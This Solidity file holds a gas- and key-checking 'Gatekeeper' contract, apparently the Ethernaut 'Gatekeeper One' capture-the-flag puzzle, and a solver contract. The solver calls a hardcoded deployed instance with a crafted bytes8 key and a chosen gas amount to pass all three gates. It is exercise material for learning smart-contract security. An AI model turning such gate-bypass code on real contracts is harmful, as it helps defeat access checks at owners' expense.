pragma  solidity ^0.8.0;

contract Gatekeeper {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 ==0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
contract GateKeeperSolver {
    function exp(uint256 _gas) external{
        //bytes 8 -> 0x123456780000F707
        // step one -> 0x  00 00 F7 07  == 0x F7 07
        // step two ->  0x  00 00 F7 07  != 0x12 34 56 78 98 76 54 43
        // step three -> tx.origin == 0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707
        //                         0x  00 00 F7 07    == 0xF7 07
        bytes8 t = 0x123456780000F707;
        (bool suc, ) = address(0x7DC304223a5Bf12B976Ef09bfE0506C9FBB96611).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)",t));
        // GatekeeperOne g = GatekeeperOne(0x38BA81BF015233A82449514bB5eB58b5D43F9059);
        // g.enter(t);
    }
}